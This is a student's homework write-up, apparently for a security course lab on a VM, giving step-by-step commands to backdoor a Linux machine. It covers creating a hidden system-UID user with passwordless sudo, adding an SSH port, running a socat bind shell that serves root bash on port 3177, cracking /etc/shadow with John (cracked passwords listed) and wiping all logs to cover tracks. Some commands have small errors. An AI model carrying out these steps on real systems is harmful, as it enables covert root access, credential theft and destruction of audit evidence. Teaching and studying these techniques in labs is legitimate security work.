# Submission for Linux HW 3

Login to the VM as root.

Create a secret user named `sysd`. Make sure this user doesn't have a home folder created.
- `useradd sysd`

Give your secret user a password.
- `passwd sysd`

Give your secret user a system UID < 1000.
- `usermod -u 300 sysd`
 
Give your secret user the same GID
- `groupmod -g 300 sysd`

Give your secret user full sudo access without the need for a password.
- `visudo`
- Add the line: `sysd ALL(ALL:ALL) NOPASSWD:ALL` under the root entry:

```bash
# User privilege specification
root    ALL=(ALL:ALL) ALL
sysd    ALL=(ALL:ALL) NOPASSWD:ALL
# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL
```

Test that sudo access works without your password:
```bash
$ su sysd
password:
$ sudo -l
Matching Defaults entries for sysd on scavenger-hunt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysd may run the following commands on scavenger-hunt:
    (ALL : ALL) NOPASSWD: ALL
```

## Allow ssh access over port 2222.

```bash
# Make changes to the sshd_config file
$ nano /etc/ssh/sshd_config

# Add an extra Port line:
Port 22
Port 2222
``` 

Restart the ssh service:
- `service ssh restart`
- OR: `systemctl restart ssh`

Note the IP address of this system:
- `ifconfig`
- Use the IP address for `eth1` interface.

Exit the root accout.
- `exit`

SSH to the machine using your sysd account and port 2222
- `ssh sysd@<your-IP-address>:2222`

Use sudo to switch to the root user
- `sudo su`

## Create a backdoor with socat

- Install socat
  - `apt install socat -y`
- Run Socat command in the background
  - `socat TCP4-Listen:3177,fork EXEC:/bin/bash &`
- Explain each part of the socat command:
  - `socat` Calls the socat program
  - `TCP4-Listen:3177` Listen for TCP connections on port `3177`
  - `,fork` Allows multiple TCP connections at once
  - `EXEC:/bin/bash` Run a Bash shell over this connection
  - `&` Run this command in the background

- Exit SSH session
  - `exit`
- Test socat connection from your local machine

```bash
$ socat STDIO TCP4:<Your-IP-address>:3177
whoami
root
```
- Close the socat connection with `CTRL + c`

## Crack _all_ the passwords
SSH back to the system using your sysd account and port 2222
- `ssh sysd@<your-ip-address>:2222`
- Use John to crack the entire /etc/shadow file
    - `sudo su`
    - `john /etc/shadow`
    - Wait approximately 5-10 mins for john to crack _all_ the passwords.
        - This partly depends on what password you set for your `sysd` user.

```bash
# john /etc/shadow
Created directory: /root/.john
Loaded 7 password hashes with 7 different salts (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
computer         (stallman)
freedom          (babbage)
trustno1         (mitnik)
dragon           (lovelace)
lakers           (turing)
passw0rd         (sysadmin)
Goodluck!        (student)
```

## Cover your tracks
Use socat and a for loop to clear all system logs.

```bash
$  $ socat STDIO TCP4:172.28.128.49:3177
whoami
root
for i in $(ls /var/log); do echo '' > $i;
 done

```